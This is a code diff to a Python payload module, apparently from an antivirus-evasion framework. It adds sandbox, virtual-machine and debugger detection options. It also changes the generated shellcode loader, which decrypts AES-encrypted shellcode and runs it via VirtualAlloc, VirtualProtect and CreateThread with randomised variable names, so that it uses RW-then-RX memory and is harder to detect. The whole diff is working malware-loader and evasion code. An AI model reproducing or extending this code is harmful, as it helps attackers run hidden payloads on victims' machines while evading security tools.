@@ -47,6 +47,15 @@ class PayloadModule:
             "DOMAIN"         : ["X", "Optional: Required internal domain"],
             "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
             "USERNAME"       : ["X", "Optional: The required user account"],
+            "CLICKTRACK"     : ["X", "Optional: Minimum number of clicks to execute payload"],
+            "UTCCHECK"       : ["FALSE", "Optional: Validates system does not use UTC timezone"],
+            "VIRTUALFILES"   : ["FALSE", "Optional: Check if VM supporting files exist"],
+            "VIRTUALDLLS"    : ["FALSE", "Check for dlls loaded in memory"],
+            "CURSORMOVEMENT" : ["FALSE", "Check if cursor is in same position after 30 seconds"],
+            "USERPROMPT"     : ["FALSE", "Make user click prompt prior to execution"],
+            "MINRAM"         : ["FALSE", "Check for at least 3 gigs of RAM"],
+            "SANDBOXPROCESS" : ["FALSE", "Check for common sandbox processes"],
+            "DETECTDEBUG"    : ["FALSE", "Check if debugger is present"],
             "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
         }
 
@@ -55,10 +64,11 @@ class PayloadModule:
         # Generate the variable names
         randctypes = evasion_helpers.randomString()
         ShellcodeVariableName = evasion_helpers.randomString()
-        RandPtr = evasion_helpers.randomString()
-        RandHt = evasion_helpers.randomString()
+        rand_ptr = evasion_helpers.randomString()
+        rand_ht = evasion_helpers.randomString()
         RandEncShellCodePayload = evasion_helpers.randomString()
         RandCipherObject = evasion_helpers.randomString()
+        rand_virtual_protect = evasion_helpers.randomString()
 
         # Generate the shellcode
         if not self.cli_shellcode:
@@ -91,10 +101,11 @@ class PayloadModule:
             payload_code += '\t' * num_tabs_required + RandCipherObject + ' = AES.new(\'' + encryption_key + '\', AES.MODE_CBC, \'' + iv_value + '\')\n'
             payload_code += '\t' * num_tabs_required + RandEncShellCodePayload + ' = base64.b64decode(\'' + encoded_ciphertext + '\')\n'
             payload_code += '\t' * num_tabs_required + ShellcodeVariableName + ' = ' + RandCipherObject + '.decrypt(' + RandEncShellCodePayload + ')\n'
-            payload_code += '\t' * num_tabs_required + RandPtr + ' = ' + randctypes + '.windll.kernel32.VirtualAlloc(' + randctypes + '.c_int(0),' + randctypes + '.c_int(len('+ ShellcodeVariableName +')),' + randctypes + '.c_int(0x3000),' + randctypes + '.c_int(0x40))\n'
-            payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + RandPtr + '),' + ShellcodeVariableName + ',' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')))\n'
-            payload_code += '\t' * num_tabs_required + RandHt + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + RandPtr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
-            payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + RandHt + '),' + randctypes + '.c_int(-1))\n'
+            payload_code += '\t' * num_tabs_required + rand_ptr + ' = ' + randctypes + '.windll.kernel32.VirtualAlloc(' + randctypes + '.c_int(0),' + randctypes + '.c_int(len('+ ShellcodeVariableName +')),' + randctypes + '.c_int(0x3000),' + randctypes + '.c_int(0x04))\n'
+            payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + rand_ptr + '),' + ShellcodeVariableName + ',' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')))\n'
+            payload_code += '\t' * num_tabs_required + rand_virtual_protect + ' = ' + randctypes + '.windll.kernel32.VirtualProtect(' + randctypes + '.c_int(' + rand_ptr + '),' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')),' + randctypes + '.c_int(0x20),' + randctypes + '.byref(' + randctypes + '.c_uint32(0)))\n'
+            payload_code += '\t' * num_tabs_required + rand_ht + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + rand_ptr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
+            payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + rand_ht + '),' + randctypes + '.c_int(-1))\n'
 
         elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
             HeapVar = evasion_helpers.randomString()
@@ -107,10 +118,10 @@ class PayloadModule:
             payload_code += '\t' * num_tabs_required + RandEncShellCodePayload + ' = base64.b64decode(\'' + encoded_ciphertext + '\')\n'
             payload_code += '\t' * num_tabs_required + ShellcodeVariableName + ' = ' + RandCipherObject + '.decrypt(' + RandEncShellCodePayload + ')\n'
             payload_code += '\t' * num_tabs_required + HeapVar + ' = ' + randctypes + '.windll.kernel32.HeapCreate(' + randctypes + '.c_int(0x00040000),' + randctypes + '.c_int(len(' + ShellcodeVariableName + ') * 2),' + randctypes + '.c_int(0))\n'
-            payload_code += '\t' * num_tabs_required + RandPtr + ' = ' + randctypes + '.windll.kernel32.HeapAlloc(' + randctypes + '.c_int(' + HeapVar + '),' + randctypes + '.c_int(0x00000008),' + randctypes + '.c_int(len( ' + ShellcodeVariableName + ')))\n'
-            payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + RandPtr + '),' + ShellcodeVariableName + ',' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')))\n'
-            payload_code += '\t' * num_tabs_required + RandHt + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + RandPtr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
-            payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + RandHt + '),' + randctypes + '.c_int(-1))\n'
+            payload_code += '\t' * num_tabs_required + rand_ptr + ' = ' + randctypes + '.windll.kernel32.HeapAlloc(' + randctypes + '.c_int(' + HeapVar + '),' + randctypes + '.c_int(0x00000008),' + randctypes + '.c_int(len( ' + ShellcodeVariableName + ')))\n'
+            payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + rand_ptr + '),' + ShellcodeVariableName + ',' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')))\n'
+            payload_code += '\t' * num_tabs_required + rand_ht + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + rand_ptr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
+            payload_code += '\t' * num_tabs_required + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + rand_ht + '),' + randctypes + '.c_int(-1))\n'
 
         if self.required_options["USE_PYHERION"][0].lower() == "y":
             payload_code = encryption.pyherion(payload_code)
